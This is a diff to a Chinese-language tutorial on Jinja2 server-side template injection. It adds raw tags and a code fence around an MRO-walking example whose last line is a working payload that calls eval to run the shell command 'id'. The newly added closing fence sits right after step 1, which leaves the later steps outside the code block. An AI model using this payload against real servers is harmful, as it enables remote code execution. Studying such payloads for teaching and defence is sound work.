@@ -266,12 +266,14 @@ Jinja2是Python最流行的模板引擎，被Flask、Django（可选）等框架
 
 理解Python的MRO（方法解析顺序）机制是构造利用链的关键：
 
+{% raw %}
 ```jinja2
 {# 步骤1：获取对象的类 #}
 {{ ''.__class__ }}           {# <class 'str'> #}
 {{ [].__class__ }}           {# <class 'list'> #}
 {{ {}.__class__ }}           {# <class 'dict'> #}
 {{ ().__class__ }}           {# <class 'tuple'> #}
+```
 
 {# 步骤2：获取基类 #}
 {{ ''.__class__.__base__ }}       {# <class 'object'> #}
@@ -298,6 +300,7 @@ Jinja2是Python最流行的模板引擎，被Flask、Django（可选）等框架
 {# 步骤8：执行任意代码 #}
 {{ ''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()') }}
 ```
+{% endraw %}
 
 **常用子类索引参考：**
 
